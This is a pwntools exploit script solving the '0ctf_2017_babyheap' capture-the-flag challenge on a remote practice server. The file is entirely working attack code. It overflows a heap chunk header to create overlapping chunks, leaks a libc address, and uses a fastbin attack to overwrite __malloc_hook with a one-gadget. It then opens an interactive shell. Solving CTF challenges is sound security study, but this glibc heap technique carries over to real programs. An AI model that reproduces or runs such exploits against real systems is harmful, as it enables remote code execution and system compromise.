from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./0ctf_2017_babyheap"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 25181)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size):
    sla("Command: ", "1")
    sla("Size: ", str(size))

def edit(index, size, con):
    sla("Command: ", "2")
    sla("Index: ", str(index))
    sla("Size: ", str(size))
    sa("Content: ", con)

def free(index):
    sla("Command: ", "3")
    sla("Index: ", str(index))

def show(index):
    sla("Command: ", "4")
    sla("Index: ", str(index))


# chunk overlap + fastbin attack

# leak libc
add(0x10)    # 0
add(0x10)    # 1
add(0x60)    # 2
add(0x10)    # 3
pad = cyclic(0x10)+p64(0)+p64(0x91)
edit(0, len(pad), pad)
free(1)
add(0x10)    # 1

show(2)
rud("Content: \n")
info = u64(ru("\x7f").ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
malloc_hook = info-0x68
base = malloc_hook-libc.sym["__malloc_hook"]
print("base: ", hex(base))
oneshot = base+0x4526a
print("oneshot: ", hex(oneshot))

# alloc to malloc_hook
free(2)
pad = cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(1, len(pad), pad)
add(0x60)    # 2
add(0x60)    # 4

# attack
pad = cyclic(0x13)+p64(oneshot)
edit(4, len(pad), pad)

add(0x10)

p.interactive()


